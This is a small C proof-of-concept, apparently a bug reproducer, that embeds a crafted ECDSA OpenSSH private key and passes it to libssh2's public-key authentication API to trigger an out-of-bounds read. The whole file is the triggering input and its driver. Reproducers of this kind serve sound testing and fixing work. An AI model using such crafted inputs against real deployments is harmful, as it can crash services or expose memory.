/* Trigger an out-of-bounds read while parsing a crafted ECDSA
 * openssh-key-v1 private key through the public API.
 */

#include <libssh2.h>

#include <stdio.h>

static const char key[] =
    "-----BEGIN OPENSSH PRIVATE KEY-----\n"
    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS\n"
    "1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQSqqqqqqqqqqqqqqqqqqqqqqqqqqqqq\n"
    "qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqAAAAJBEiM0QRIj\n"
    "NEAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAABbg==\n"
    "-----END OPENSSH PRIVATE KEY-----\n";

int main(void)
{
    LIBSSH2_SESSION *session;
    int rc;

    session = libssh2_session_init();
    if(!session)
        return 1;

    rc = libssh2_userauth_publickey_frommemory(session, "user", 4,
                                               NULL, 0,
                                               key, sizeof(key) - 1,
                                               NULL);
    fprintf(stderr,
            "libssh2_userauth_publickey_frommemory returned %d\n", rc);

    libssh2_session_free(session);

    return 0;
}
